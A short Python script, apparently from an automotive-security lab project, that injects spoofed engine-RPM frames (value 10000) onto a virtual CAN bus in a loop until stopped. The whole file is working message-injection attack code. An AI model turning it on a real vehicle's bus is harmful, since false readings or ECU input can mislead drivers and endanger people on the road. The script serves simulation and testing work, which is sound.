import can
import time

# Import global variables from config file
from src.core.config import CAN_ID_RPM

# Connect to virtual CAN network
bus = can.interface.Bus(channel='vcan0', interface='socketcan')

print("RPM spoof attack initiated... Press Ctrl+C to stop.")

try:
    while True:
        # Inject fake RPM value
        rpm = 10000

        # Convert RPM into 2 bytes
        rpm_low = rpm & 0xFF
        rpm_high = (rpm >> 8) & 0xFF

        # Send attack messages
        msg = can.Message(
            arbitration_id=CAN_ID_RPM,
            data=[rpm_low, rpm_high],
            is_extended_id=False
        )
        bus.send(msg)
        
        # Setting signal frequency
        time.sleep(0.2)

# If interupt sent stop sneding messages and print
except KeyboardInterrupt:
    print("\nRPM spoof attack stopped.")